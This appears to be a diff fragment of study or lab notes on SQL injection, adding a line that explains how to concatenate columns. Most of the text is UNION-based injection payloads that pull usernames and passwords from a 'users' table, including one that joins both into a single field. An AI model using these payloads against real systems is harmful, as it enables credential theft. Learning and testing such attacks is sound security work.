@@ -15,3 +15,7 @@
 ' union select null,username from users--
 
 ' union select null,password from users--
+
+Or we can concatenate both strings like that
+
+' union select null,username||password from users--
